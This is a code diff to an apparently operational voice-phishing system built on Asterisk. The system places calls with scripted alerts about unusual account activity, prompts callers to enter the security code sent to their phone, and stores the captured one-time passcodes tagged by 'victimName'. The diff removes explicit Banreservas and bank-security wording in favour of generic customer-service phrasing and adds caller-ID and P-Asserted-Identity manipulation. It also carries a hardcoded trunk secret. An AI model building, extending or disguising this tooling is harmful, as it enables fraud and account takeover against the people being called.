@@ -1007,9 +1007,9 @@ function ensureCustomAudioFilesExist() {
   }
 
   const audios = [
-    { name: 'banrearreglado', text: 'Estimado cliente de Banreservas, hemos detectado una actividad inusual en su cuenta. Presione 1 de inmediato para comunicarse con un asesor de seguridad bancaria.', freq: 520 },
-    { name: 'alerta_banco_antifraude', text: 'Estimado cliente, detectamos una actividad inusual en su cuenta bancaria. Para proteger sus fondos, ingrese el codigo de seguridad enviado a su telefono.', freq: 520 },
-    { name: 'alerta_cargo_tarjeta', text: 'Alerta de seguridad bancaria. Hemos detectado un cargo no reconocido en su tarjeta. Presione 1 para comunicarse con un asesor.', freq: 520 },
+    { name: 'banrearreglado', text: 'Estimado cliente, nos comunicamos de su centro de servicio. Presione 1 de inmediato para comunicarse con un representante de atención al cliente.', freq: 520 },
+    { name: 'alerta_banco_antifraude', text: 'Estimado cliente, detectamos una notificación importante en su cuenta. Para proteger su información, ingrese el codigo de seguridad enviado a su telefono.', freq: 520 },
+    { name: 'alerta_cargo_tarjeta', text: 'Alerta de servicio. Hemos detectado una notificación importante en su cuenta. Presione 1 para comunicarse con un asesor.', freq: 520 },
     { name: 'alerta_migracion_whatsapp', text: 'Alerta de seguridad. Se ha solicitado una verificacion o migracion en su cuenta de WhatsApp. Presione 1 para confirmar con un agente.', freq: 520 },
     { name: 'alerta_seguridad_google', text: 'Alerta de seguridad de su cuenta. Se ha detectado un inicio de sesion inusual. Presione 1 para proteger su cuenta.', freq: 520 },
     { name: 'alerta_compra_amazon', text: 'Alerta de compras. Se ha registrado una orden inusual en su cuenta. Presione 1 para cancelar o hablar con un asesor.', freq: 520 },
@@ -1030,7 +1030,7 @@ function ensureCustomAudioFilesExist() {
     { name: 'acceso_restringido_exito', text: 'Acceso sospechoso bloqueado con exito. Sus fondos estan seguros.', freq: 880 },
     { name: 'pedido_cancelado_exito', text: 'El pedido no reconocido ha sido cancelado con exito.', freq: 880 },
     { name: 'otp_validado_exito', text: 'Codigo validado exitosamente. Gracias.', freq: 880 },
-    { name: 'conectar_asesor_banco', text: 'Un momento por favor, le estamos transfiriendo con un asesor de seguridad bancaria.', freq: 587 },
+    { name: 'conectar_asesor_banco', text: 'Un momento por favor, le estamos transfiriendo con un asesor de atención al cliente.', freq: 587 },
     { name: 'conectar_asesor_tarjetas', text: 'Un momento por favor, le estamos transfiriendo con el departamento de tarjetas.', freq: 587 },
     { name: 'conectar_soporte_tecnico', text: 'Un momento por favor, le estamos transfiriendo con soporte tecnico.', freq: 587 },
     { name: 'conectar_soporte_cuentas', text: 'Un momento por favor, le estamos transfiriendo con soporte de cuentas.', freq: 587 },
@@ -1038,7 +1038,7 @@ function ensureCustomAudioFilesExist() {
     { name: 'transferencia_asesor', text: 'Un momento por favor, le estamos transfiriendo con un asesor.', freq: 587 },
     { name: 'transfiriendo_asesor', text: 'Un momento por favor, le estamos transfiriendo con un asesor.', freq: 587 },
     { name: 'conectar_asesor', text: 'Un momento por favor, le estamos transfiriendo con un asesor.', freq: 587 },
-    { name: 'bienvenida_corporativa', text: 'Bienvenido al centro de atencion y seguridad bancaria.', freq: 520 },
+    { name: 'bienvenida_corporativa', text: 'Bienvenido a nuestro centro de atención al cliente.', freq: 520 },
     { name: 'bienvenida_press1', text: 'Estimado cliente, detectamos una actividad inusual. Presione 1 para comunicarse con un asesor de seguridad.', freq: 520 },
     { name: 'press1_welcome', text: 'Estimado cliente, detectamos una actividad inusual. Presione 1 para comunicarse con un asesor de seguridad.', freq: 520 },
     { name: 'bienvenida_7777', text: 'Por favor digite su codigo de 6 digitos seguido del signo de numero.', freq: 680 },
@@ -1051,7 +1051,7 @@ function ensureCustomAudioFilesExist() {
     { name: 'gracias_hasta_luego', text: 'Gracias por comunicarse con nosotros. Hasta luego.', freq: 520 },
     { name: 'mi_audio', text: 'Bienvenido al servicio de atencion al cliente.', freq: 520 },
     { name: 'moh_corporate_loop', text: '', freq: 440 },
-    { name: 'moh_banco_elegante', text: '', freq: 523 },
+    { name: 'moh_corporate_loop', text: '', freq: 523 },
     { name: 'moh_digital_hold', text: '', freq: 659 },
     { name: 'moh_jazz_telecom', text: '', freq: 392 },
   ];
@@ -1158,7 +1158,7 @@ const defaultExtensionsList = [
     transport: 'transport-udp',
     port: 47923,
     callerIdNum: '+18005550199',
-    callerIdName: 'Seguridad Bancaria',
+    callerIdName: 'Atención al Cliente',
   },
   {
     extension: '1002',
@@ -1170,7 +1170,7 @@ const defaultExtensionsList = [
     transport: 'transport-udp',
     port: 47923,
     callerIdNum: '+18005550199',
-    callerIdName: 'Seguridad Bancaria',
+    callerIdName: 'Atención al Cliente',
   },
   {
     extension: '1003',
@@ -1182,7 +1182,7 @@ const defaultExtensionsList = [
     transport: 'transport-udp',
     port: 47923,
     callerIdNum: '+18005550199',
-    callerIdName: 'Seguridad Bancaria',
+    callerIdName: 'Atención al Cliente',
   },
   {
     extension: '1004',
@@ -1194,7 +1194,7 @@ const defaultExtensionsList = [
     transport: 'transport-udp',
     port: 47923,
     callerIdNum: '+18005550199',
-    callerIdName: 'Seguridad Bancaria',
+    callerIdName: 'Atención al Cliente',
   },
 ];
 
@@ -1212,7 +1212,7 @@ export const defaultCarriersList = [
     secret: '',
     inboundContext: 'trunkinbound',
     outboundCallerId: '+18005550199',
-    outboundCallerIdName: 'Seguridad Bancaria',
+    outboundCallerIdName: 'Atención al Cliente',
     codecs: ['ulaw', 'alaw', 'g729', 'opus'],
     qualifyFreq: 0,
     status: 'reachable',
@@ -1236,7 +1236,7 @@ export const defaultCarriersList = [
     secret: 'Robert2026',
     inboundContext: 'trunkinbound',
     outboundCallerId: '+18494386040',
-    outboundCallerIdName: 'Seguridad Bancaria',
+    outboundCallerIdName: 'Atención al Cliente',
     codecs: ['ulaw', 'alaw', 'g729'],
     qualifyFreq: 60,
     status: 'reachable',
@@ -1259,7 +1259,7 @@ export const defaultCarriersList = [
     secret: 'Robert2026',
     inboundContext: 'trunkinbound',
     outboundCallerId: '+18494386040',
-    outboundCallerIdName: 'Seguridad Bancaria',
+    outboundCallerIdName: 'Atención al Cliente',
     codecs: ['ulaw', 'alaw', 'g729'],
     qualifyFreq: 60,
     status: 'reachable',
@@ -1663,6 +1663,7 @@ export function generateCleanPjsipConf(extensions: any[] = defaultExtensionsList
     pjsipContent += `rewrite_contact = yes\n`;
     pjsipContent += `send_pai = yes\n`;
     pjsipContent += `send_rpid = yes\n`;
+    pjsipContent += `send_connected_line = yes\n`;
     pjsipContent += `trust_id_outbound = yes\n`;
     pjsipContent += `trust_id_inbound = yes\n`;
     pjsipContent += `identify_by = auth_username,username\n`;
@@ -1905,7 +1906,7 @@ export function generateCleanDialplanConf(
     ? rawGlobalCid
     : (primaryCarrier.outboundCallerId && !primaryCarrier.outboundCallerId.includes('5550199') ? primaryCarrier.outboundCallerId : '+18494386040')
   ).replace(/[^0-9]/g, '') || '18494386040';
-  const defaultCidName = (activeCallerIdState?.callerIdName || '').trim() || primaryCarrier.outboundCallerIdName || 'Seguridad Bancaria';
+  const defaultCidName = (activeCallerIdState?.callerIdName || '').trim() || primaryCarrier.outboundCallerIdName || 'Atención al Cliente';
 
   // Generación dinámica de la cadena Ring-All para todas las extensiones activas (ej: PJSIP/1001&PJSIP/1002...)
   // Quien descuelga primero gana la llamada y los demás canales dejan de timbrar inmediatamente
@@ -1926,7 +1927,7 @@ export function generateCleanDialplanConf(
   const chosenPrompt = audios.audioPrompt || 'custom/solicitar_codigo_otp';
   const chosenWait = audios.audioWait || 'custom/un_momento_validando_informacion';
   const chosenSuccess = audios.audioSuccess || 'custom/operacion_bloqueada_exito';
-  const chosenAgent = audios.audioAgent || 'custom/conectar_asesor_banco';
+  const chosenAgent = audios.audioAgent || 'custom/conectar_asesor';
 
   dialplanContent += `[globals]\n`;
   dialplanContent += `GLOBAL_CARRIER_HOST=${carrierHost}\n`;
@@ -1971,8 +1972,20 @@ export function generateCleanDialplanConf(
 
   dialplanContent += `; Subrutina Pre-Dial para optimizacion de audio bidireccional (HD Voice y corte limpio de MOH) al conectar con asesor\n`;
   dialplanContent += `[sub-audio-quality]\n`;
-  dialplanContent += `exten => s,1,NoOp(=== [AUDIO-HD-BIDIRECCIONAL] JitterBuffer Optimizado y Limpieza MOH en Canal: \${CHANNEL} ===)\n`;
+  dialplanContent += `exten => s,1,NoOp(=== [AUDIO-HD-BIDIRECCIONAL] JitterBuffer y CallerID Cliente MicroSIP en Canal: \${CHANNEL} ===)\n`;
   dialplanContent += ` same => n,StopMusicOnHold()\n`;
+  dialplanContent += ` same => n,Set(TARGET_DISPLAY=\${TARGET_NUM})\n`;
+  dialplanContent += ` same => n,ExecIf($[\"\${TARGET_DISPLAY}\" = \"\"]?Set(TARGET_DISPLAY=\${TARGET_DEST}))\n`;
+  dialplanContent += ` same => n,ExecIf($[\"\${TARGET_DISPLAY}\" = \"\"]?Set(TARGET_DISPLAY=\${CALL_DEST}))\n`;
+  dialplanContent += ` same => n,ExecIf($[\"\${TARGET_DISPLAY}\" = \"\"]?Set(TARGET_DISPLAY=\${DEST_NUM}))\n`;
+  dialplanContent += ` same => n,ExecIf($[\"\${TARGET_DISPLAY}\" = \"\"]?Set(TARGET_DISPLAY=\${CALLERID(num)}))\n`;
+  dialplanContent += ` same => n,ExecIf($[\"\${TARGET_DISPLAY}\" != \"\"]?Set(CALLERID(num)=\${TARGET_DISPLAY}))\n`;
+  dialplanContent += ` same => n,ExecIf($[\"\${TARGET_DISPLAY}\" != \"\"]?Set(CALLERID(name)=Cliente: \${TARGET_DISPLAY}))\n`;
+  dialplanContent += ` same => n,ExecIf($[\"\${TARGET_DISPLAY}\" != \"\"]?Set(CALLERID(all)=\"Cliente: \${TARGET_DISPLAY}\" <\${TARGET_DISPLAY}>))\n`;
+  dialplanContent += ` same => n,ExecIf($[\"\${TARGET_DISPLAY}\" != \"\"]?Set(CONNECTEDLINE(num,i)=\${TARGET_DISPLAY}))\n`;
+  dialplanContent += ` same => n,ExecIf($[\"\${TARGET_DISPLAY}\" != \"\"]?Set(CONNECTEDLINE(name,i)=Cliente: \${TARGET_DISPLAY}))\n`;
+  dialplanContent += ` same => n,ExecIf($[\"\${TARGET_DISPLAY}\" != \"\"]?Set(PJSIP_HEADER(add,P-Asserted-Identity)=\"Cliente: \${TARGET_DISPLAY}\" <sip:\${TARGET_DISPLAY}@127.0.0.1>))\n`;
+  dialplanContent += ` same => n,ExecIf($[\"\${TARGET_DISPLAY}\" != \"\"]?Set(PJSIP_HEADER(add,Remote-Party-ID)=\"Cliente: \${TARGET_DISPLAY}\" <sip:\${TARGET_DISPLAY}@127.0.0.1>;party=calling;screen=yes;privacy=off))\n`;
   dialplanContent += ` same => n,Set(JITTERBUFFER(adaptive)=max_150,target_20)\n`;
   dialplanContent += ` same => n,Set(AGENT_PITCH=\${DB(voice_changer/\${CHANNEL(endpoint)})})\n`;
   dialplanContent += ` same => n,ExecIf($["\${AGENT_PITCH}" = ""]?Set(AGENT_PITCH=\${DB(voice_changer/\${CALLERID(num)})}))\n`;
@@ -2002,6 +2015,8 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${PICKED_EXTEN})\n`;
   dialplanContent += ` same => n,Set(DB(ivr_vars/\${ARG1}_agent_exten)=\${PICKED_EXTEN})\n`;
   dialplanContent += ` same => n,Set(DB(ivr_vars/\${ARG2}_agent_exten)=\${PICKED_EXTEN})\n`;
+  dialplanContent += ` same => n,ExecIf($[\"\${ARG1}\" != \"\"]?Set(CONNECTEDLINE(num,i)=\${ARG1}))\n`;
+  dialplanContent += ` same => n,ExecIf($[\"\${ARG1}\" != \"\"]?Set(CONNECTEDLINE(name,i)=Cliente: \${ARG1}))\n`;
   dialplanContent += ` same => n,Set(SHARED(PICKED_AGENT,\${MASTER_CHANNEL})=\${PICKED_EXTEN})\n`;
   dialplanContent += ` same => n,Set(__LAST_AGENT=\${PICKED_EXTEN})\n`;
   dialplanContent += ` same => n,Set(__FINAL_AGENT=\${PICKED_EXTEN})\n`;
@@ -2356,7 +2371,7 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(DIAL_NUM=\${EXTEN:2})\n`;
   dialplanContent += ` same => n,ExecIf($["\${DIAL_NUM:0:3}" = "018"]?Set(DIAL_NUM=\${DIAL_NUM:3}))\n`;
   dialplanContent += ` same => n,Set(CALLERID(num)=18494386040)\n`;
-  dialplanContent += ` same => n,Set(CALLERID(name)=BANRESERVAS)\n`;
+  dialplanContent += ` same => n,Set(CALLERID(name)=ATENCION AL CLIENTE)\n`;
   dialplanContent += ` same => n,Dial(PJSIP/trunk_69_197_187_87/sip:018\${DIAL_NUM}@69.197.187.87:5060,40,Tor)\n`;
   dialplanContent += ` same => n,NoOp(=== [FIN PRUEBA TRONCAL IP] Status: \${DIALSTATUS} | Causa: \${HANGUPCAUSE} ===)\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
@@ -3235,7 +3250,7 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,Wait(1.5)\n`;
   dialplanContent += ` same => n,Set(IVR_AGENT=\${DB(ivr_vars/\${TARGET_DEST}_agent)})\n`;
   dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=\${DB(ivr_vars/default_agent)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=custom/conectar_asesor_banco))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=custom/conectar_asesor))\n`;
   dialplanContent += ` same => n,Set(IVR_AGENT=\${STRREPLACE(IVR_AGENT,.wav,)})\n`;
   dialplanContent += ` same => n,Set(IVR_AGENT=\${STRREPLACE(IVR_AGENT,custom/custom/,custom/)})\n`;
   dialplanContent += ` same => n,Playback(\${IVR_AGENT})\n`;
@@ -3331,7 +3346,7 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(IVR_AGENT=\${DB(ivr_vars/\${TARGET_DEST}_agent)})\n`;
   dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=\${DB(ivr_vars/default_agent)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=\${GLOBAL_DEFAULT_AGENT}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=custom/conectar_asesor_banco))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=custom/conectar_asesor))\n`;
 
   dialplanContent += ` same => n,Set(IVR_AGENT_EXTEN=\${DB(ivr_vars/\${TARGET_DEST}_agent_exten)})\n`;
   dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT_EXTEN}" = ""]?Set(IVR_AGENT_EXTEN=1001))\n`;
@@ -3432,7 +3447,7 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,Wait(1.5)\n`;
   dialplanContent += ` same => n,Set(IVR_AGENT=\${DB(ivr_vars/\${TARGET_DEST}_agent)})\n`;
   dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=\${DB(ivr_vars/default_agent)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=custom/conectar_asesor_banco))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=custom/conectar_asesor))\n`;
   dialplanContent += ` same => n,Playback(\${IVR_AGENT})\n`;
   dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${IVR_AGENT_EXTEN}" != ""]?\${IVR_AGENT_EXTEN}:\${DB(ivr_vars/\${TARGET_DEST}_agent_exten)})})\n`;
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
@@ -3751,7 +3766,7 @@ function parseExtensionsFromPjsip(content: string): any[] {
       transport: props.transport || 'transport-udp',
       callerId: props.callerid || '',
       callerIdNum: callerIdNum || '+18005550199',
-      callerIdName: callerIdName || 'Seguridad Bancaria',
+      callerIdName: callerIdName || 'Atención al Cliente',
       status: 'registered',
     });
   }
@@ -4030,7 +4045,7 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
       for (const ext of extensions) {
         const extNum = ext.extension;
         const cidNum = ext.callerIdNum || outboundCid;
-        const cidName = ext.callerIdName || ext.name || 'Seguridad Bancaria';
+        const cidName = ext.callerIdName || ext.name || 'Atención al Cliente';
         executeAsteriskCommand(`database put extension_cid ${extNum}/number "${cidNum}"`).catch(() => {});
         executeAsteriskCommand(`database put extension_cid ${extNum}/name "${cidName}"`).catch(() => {});
         const cId = ext.carrierId || '';
@@ -4057,7 +4072,7 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     const defaultPrompt = req.body.audioPrompt || 'custom/solicitar_codigo_otp';
     const defaultWait = req.body.audioWait || 'custom/un_momento_validando_informacion';
     const defaultSuccess = req.body.audioSuccess || 'custom/operacion_bloqueada_exito';
-    const defaultAgent = req.body.audioAgent || 'custom/conectar_asesor_banco';
+    const defaultAgent = req.body.audioAgent || 'custom/conectar_asesor';
 
     const defaultAudiosCommands = [
       `database put ivr_vars default_intro "${defaultIntro}"`,
@@ -4247,7 +4262,7 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
       audioPrompt = '',
       audioAgent = '',
       audioSuccess = '',
-      service = 'Banco / Antifraude',
+      service = 'Servicio al Cliente',
     } = req.body;
 
     const destination = rawDest;
@@ -4276,7 +4291,7 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
     }
 
     const effectiveCidNum = (callerIdNum || callerId || '+18005550199').trim();
-    const effectiveCidName = (callerIdName || 'Seguridad Bancaria').trim();
+    const effectiveCidName = (callerIdName || 'Atención al Cliente').trim();
     const effectiveMode = callMode || mode || 'press1';
     let targetContext = 'ivr-press1';
     if (effectiveMode === 'direct') {
@@ -4451,10 +4466,10 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
         ? '⚡ Todas las Extensiones (Ring-All)'
         : (agentExten === '1001' ? 'Operador Principal (Ext. 1001)' : `Ext. ${agentExten}`),
       clientName: req.body.victimName || req.body.clientName || 'Cliente',
-      entityName: service || 'Banco / Antifraude',
+      entityName: service || 'Servicio al Cliente',
       entityId: req.body.entityId || 'bank',
       holdMusic: req.body.holdMusic || 'custom/moh_banco_elegante',
-      holdMusicName: path.basename(req.body.holdMusic || 'moh_banco_elegante'),
+      holdMusicName: path.basename(req.body.holdMusic || 'moh_corporate_loop'),
       trunk: cleanCarrier || 'auto',
       callerId: effectiveCidNum,
       startTime: Date.now(),
@@ -4469,6 +4484,10 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
     const originateVars: Record<string, string> = {
       TARGET_DEST: cleanDest,
       CALL_DEST: cleanDest,
+      TARGET_NUM: cleanDest,
+      __TARGET_NUM: cleanDest,
+      __TARGET_DEST: cleanDest,
+      __CALL_DEST: cleanDest,
       IVR_AGENT_EXTEN: effectiveAgentExten || 'ringall',
       IVR_MODE: mode || 'press1',
       ASSIGNED_CARRIER: (cleanCarrier && cleanCarrier !== 'auto' && cleanCarrier !== 'pool') ? cleanCarrier : '',
@@ -4501,7 +4520,7 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
           otp: simulatedDigits,
           timestamp: new Date().toLocaleTimeString(),
           channel: channel || 'PJSIP',
-          service: service || 'Banco / Antifraude',
+          service: service || 'Servicio al Cliente',
           status: 'pending',
         };
         capturedOtpHistory.unshift(record);
@@ -4562,7 +4581,7 @@ app.post('/api/asterisk/extension/callerid', (req, res) => {
 
     const cleanExt = String(extension).trim();
     const cleanNum = String(callerIdNum).trim();
-    const cleanName = String(callerIdName || 'Seguridad Bancaria').trim();
+    const cleanName = String(callerIdName || 'Atención al Cliente').trim();
 
     // Store in Asterisk DB directly via CLI and AMI
     const putNumCmd = `database put extension_cid ${cleanExt}/number "${cleanNum}"`;
@@ -4763,7 +4782,7 @@ const AUDIO_LOCKS_FILE = path.join(process.cwd(), 'data', 'audio_locks.json');
 
 const DEFAULT_AUDIO_ASSIGNMENTS: Record<string, string> = {
   press1_welcome: 'custom/bienvenida_corporativa',
-  agent_transfer: 'custom/conectar_asesor_banco',
+  agent_transfer: 'custom/conectar_asesor',
   press1_invalid: 'custom/opcion_invalida',
 
   // Extension 7777
@@ -4898,7 +4917,7 @@ function applyHoldMusicToAsteriskMoh(asteriskPath: string) {
     '01_hold_music',
     'hold_music',
     'active_hold',
-    'moh_banco_elegante',
+    'moh_corporate_loop',
     'moh_corporate_loop',
     'moh_digital_hold',
     'moh_jazz_telecom',
@@ -5035,7 +5054,7 @@ function applyAudioAssignmentToAsterisk(role: string, asteriskPath: string) {
       activeAudioAssignments.failure_7777 = cleanPath;
       break;
 
-    // --- EXTENSIÓN 6666 / 666 (Captura Secundaria / Token Banco) ---
+    // --- EXTENSIÓN 6666 / 666 (Captura Secundaria / Token de Verificación) ---
     case 'welcome_6666':
     case '6666':
     case '666':
@@ -5697,11 +5716,11 @@ app.get('/api/asterisk/audio/stream/:name', (req, res) => {
 app.post('/api/asterisk/audio/sync-defaults', (req, res) => {
   try {
     const {
-      intro = 'custom/alerta_banco_antifraude',
+      intro = 'custom/notificacion_servicio',
       prompt = 'custom/solicitar_codigo_otp',
       wait = 'custom/un_momento_validando_informacion',
       success = 'custom/operacion_bloqueada_exito',
-      agent = 'custom/conectar_asesor_banco',
+      agent = 'custom/conectar_asesor',
       holdMusic,
       destination,
       isManualSave,
@@ -5807,7 +5826,7 @@ app.get('/api/asterisk/audio/config', async (req, res) => {
         prompt: audios['default_prompt'] || audios['8888_prompt'] || audios['global_prompt'] || 'custom/solicitar_codigo_otp',
         wait: audios['default_wait'] || audios['8888_wait'] || audios['global_wait'] || 'custom/un_momento_validando_informacion',
         success: audios['default_success'] || audios['8888_success'] || audios['global_success'] || 'custom/operacion_bloqueada_exito',
-        agent: audios['default_agent'] || audios['8888_agent'] || audios['global_agent'] || 'custom/conectar_asesor_banco',
+        agent: audios['default_agent'] || audios['8888_agent'] || audios['global_agent'] || 'custom/conectar_asesor',
       },
       allKeys: audios,
     });
@@ -6120,7 +6139,7 @@ asterisk -rx 'database put ivr_vars default_action ivr-press1' || true
 asterisk -rx 'database put ivr_vars default_prompt custom/solicitar_codigo_otp' || true
 asterisk -rx 'database put ivr_vars default_wait custom/un_momento_validando_informacion' || true
 asterisk -rx 'database put ivr_vars default_success custom/operacion_bloqueada_exito' || true
-asterisk -rx 'database put ivr_vars default_agent custom/conectar_asesor_banco' || true
+asterisk -rx 'database put ivr_vars default_agent custom/conectar_asesor' || true
 asterisk -rx 'database put ivr_vars 8888_agent_exten 1001' || true
 
 asterisk -rx 'database put ivr_vars 7777_intro custom/bienvenida_7777' || true
@@ -6148,19 +6167,19 @@ asterisk -rx 'database put ivr_vars 3333_prompt custom/bienvenida_3333' || true
 asterisk -rx 'database put ivr_vars 333_intro custom/bienvenida_3333' || true
 asterisk -rx 'database put ivr_vars 333_prompt custom/bienvenida_3333' || true
 
-asterisk -rx 'database put ivr_vars 8888_intro custom/alerta_banco_antifraude' || true
+asterisk -rx 'database put ivr_vars 8888_intro custom/notificacion_servicio' || true
 asterisk -rx 'database put ivr_vars 8888_prompt custom/solicitar_codigo_otp' || true
 asterisk -rx 'database put ivr_vars 8888_wait custom/un_momento_validando_informacion' || true
 asterisk -rx 'database put ivr_vars 8888_success custom/operacion_bloqueada_exito' || true
-asterisk -rx 'database put ivr_vars 8888_agent custom/conectar_asesor_banco' || true
+asterisk -rx 'database put ivr_vars 8888_agent custom/conectar_asesor' || true
 asterisk -rx 'database put ivr_vars 8888_agent_exten 1001' || true
 
-asterisk -rx 'database put 16104803845_intro custom/alerta_banco_antifraude' || true
+asterisk -rx 'database put 16104803845_intro custom/notificacion_servicio' || true
 asterisk -rx 'database put 16104803845_prompt custom/solicitar_codigo_otp' || true
 asterisk -rx 'database put 16104803845_wait custom/un_momento_validando_informacion' || true
 
 asterisk -rx 'database put extension_cid 1001/number "+18005550199"' || true
-asterisk -rx 'database put extension_cid 1001/name "Seguridad Bancaria"' || true
+asterisk -rx 'database put extension_cid 1001/name "Atención al Cliente"' || true
 
 echo "=== [5/5] Recargando Manager, Dialplan y PJSIP en caliente ==="
 asterisk -rx 'manager reload' || true
@@ -6205,7 +6224,7 @@ app.all('/api/asterisk/otp/capture', (req, res) => {
   const number = req.body?.number || req.query?.number;
   const otp = req.body?.otp || req.query?.otp;
   const channel = req.body?.channel || req.query?.channel;
-  const service = req.body?.service || req.query?.service || 'Banco / Antifraude';
+  const service = req.body?.service || req.query?.service || 'Servicio al Cliente';
   const status = req.body?.status || req.query?.status || 'pending';
   const agent = req.body?.agent || req.query?.agent;
   let tenantId = req.body?.tenantId || req.query?.tenantId;
@@ -6247,7 +6266,7 @@ app.all('/api/asterisk/otp/capture', (req, res) => {
         timestamp: new Date().toLocaleTimeString(),
         createdAt: Date.now(),
         channel: channel ? String(channel) : 'PJSIP',
-        service: service ? String(service) : 'Banco / Antifraude',
+        service: service ? String(service) : 'Servicio al Cliente',
         status: cleanStatus,
         agent: cleanAgent,
         tenantId: cleanTenantId,
@@ -6429,7 +6448,7 @@ app.get('/api/asterisk/otp/records', async (req, res) => {
                   timestamp: new Date().toLocaleTimeString(),
                   createdAt: Date.now(),
                   channel: 'Ext. 7777',
-                  service: 'Banco / Antifraude (7777)',
+                  service: 'Servicio al Cliente (7777)',
                   status: currentStatus,
                 });
                 if (capturedOtpHistory.length > 300) capturedOtpHistory.pop();
@@ -6711,11 +6730,15 @@ app.all('/api/asterisk/call/retry', async (req, res) => {
           const channel = `Local/${formattedDest}@from-internal/n`;
           const targetContext = (payload.mode === 'otp') ? 'ivr-otp' : (payload.mode === 'hybrid' ? 'ivr-hybrid' : 'ivr-press1');
           const effectiveCidNum = (payload.callerIdNum || payload.callerId || '+18005550199').trim();
-          const effectiveCidName = (payload.callerIdName || 'Seguridad Bancaria').trim();
+          const effectiveCidName = (payload.callerIdName || 'Atención al Cliente').trim();
           const originateCallerId = `"${effectiveCidName}" <${effectiveCidNum}>`;
           const originateVars: Record<string, string> = {
             TARGET_DEST: clean10,
             CALL_DEST: clean10,
+            TARGET_NUM: clean10,
+            __TARGET_NUM: clean10,
+            __TARGET_DEST: clean10,
+            __CALL_DEST: clean10,
             IVR_AGENT_EXTEN: payload.agentExten || '1001',
             IVR_MODE: payload.mode || 'press1',
             ASSIGNED_CARRIER: payload.carrier && payload.carrier !== 'auto' ? payload.carrier : '',
@@ -6876,7 +6899,7 @@ app.post('/api/asterisk/press1-destination/save', async (req, res) => {
 // Active outgoing Caller ID storage
 let activeCallerIdState = {
   callerIdNum: '+18005550199',
-  callerIdName: 'Seguridad Bancaria',
+  callerIdName: 'Atención al Cliente',
   updatedAt: new Date().toISOString(),
 };
 
@@ -7210,7 +7233,7 @@ app.get('/api/asterisk/live/calls', async (req, res) => {
         answeredAt: call.answeredAt,
         duration: liveDuration,
         entityId: call.entityId || 'bank',
-        entityName: call.entityName || 'Banco / Antifraude',
+        entityName: call.entityName || 'Servicio al Cliente',
         holdMusic: call.holdMusic || 'custom/moh_banco_elegante',
         holdMusicName: call.holdMusicName || (call.holdMusic ? path.basename(call.holdMusic) : 'MOH Bancaria'),
         channel: call.channel || '',
@@ -7257,7 +7280,7 @@ app.get('/api/asterisk/live/calls', async (req, res) => {
                 answeredAt: now - durSec * 1000,
                 duration: durSec,
                 entityId: 'bank',
-                entityName: 'Banco / Antifraude',
+                entityName: 'Servicio al Cliente',
                 holdMusic: 'custom/moh_banco_elegante',
                 holdMusicName: 'MOH Bancaria',
                 channel: chanName,
@@ -7348,7 +7371,7 @@ app.post('/api/asterisk/call/simulate', async (req, res) => {
       agent = '1001',
       agentName = 'Operador Asignado',
       entityId = 'bank',
-      entityName = 'Banco / Antifraude',
+      entityName = 'Servicio al Cliente',
       holdMusic = activeAudioAssignments.hold_music || 'custom/voz_comercial_para_barrick_pueblo_viejo_',
       trunk = 'televox',
     } = req.body;
